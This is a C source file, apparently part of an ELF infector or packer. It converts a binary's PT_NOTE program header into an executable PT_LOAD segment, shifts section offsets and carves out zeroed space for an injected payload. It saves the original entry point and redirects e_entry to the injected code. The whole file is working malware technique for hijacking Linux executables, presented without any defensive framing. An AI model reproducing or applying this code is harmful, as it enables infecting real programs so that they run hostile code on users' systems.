/* PT_NOTE to PT_LOAD conversion */

#include "note.h"
#include "map.h"
#include <string.h>

#define PAGE_SIZE 0x1000

int note(t_data *data, size_t payload_size) {
	size_t elf_size = data->elf.size;

	data->file = expand_file(data->file, data->size, data->size + payload_size, data);
	if (!data->file)
		return -1;

	/* locate data segment */

	Elf64_Phdr	*phdr = data->elf.phdr;
	Elf64_Shdr	*shdr = data->elf.shdr;
	Elf64_Ehdr	*ehdr = data->elf.ehdr;

	data->cave.old_entry = ehdr->e_entry;

	ehdr->e_shoff += payload_size;

	uint64_t ds_end_addr = 0;
	uint64_t ds_end_offset = 0;
	uint32_t ds_align = 0;

	for (size_t i = 0; i < ehdr->e_phnum; ++i) {
		if (phdr[i].p_type == PT_LOAD && phdr[i].p_flags == (PF_R | PF_W)) {
			ds_end_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
			ds_end_offset = phdr[i].p_offset + phdr[i].p_filesz;
			ds_align = phdr[i].p_align;
			break;
		}
	}

	/* locate note segment */

	for (size_t i = 0; i < ehdr->e_phnum; ++i) {
		if (phdr[i].p_type == PT_NOTE) {
			phdr[i].p_type = PT_LOAD;
			phdr[i].p_flags = PF_R | PF_X;
			phdr[i].p_offset = ds_end_offset;
			phdr[i].p_vaddr = ds_end_addr + ds_align;
			phdr[i].p_paddr = ds_end_addr + ds_align;
			phdr[i].p_filesz += payload_size;
			phdr[i].p_memsz += payload_size;
			phdr[i].p_align = PAGE_SIZE;
			break;
		}
	}

	for (size_t i = 0; i < ehdr->e_shnum; ++i) {
		if (shdr[i].sh_offset > ds_end_offset) {
			shdr[i].sh_offset += payload_size;
		}
	}

	data->cave.offset = ds_end_offset;
	data->cave.addr = ds_end_addr + ds_align;
	ehdr->e_entry = data->cave.addr;

	memmove(data->file + data->cave.offset + payload_size, data->file + data->cave.offset, elf_size - data->cave.offset);
	memset(data->file + data->cave.offset, 0, payload_size);

	return 0;
}
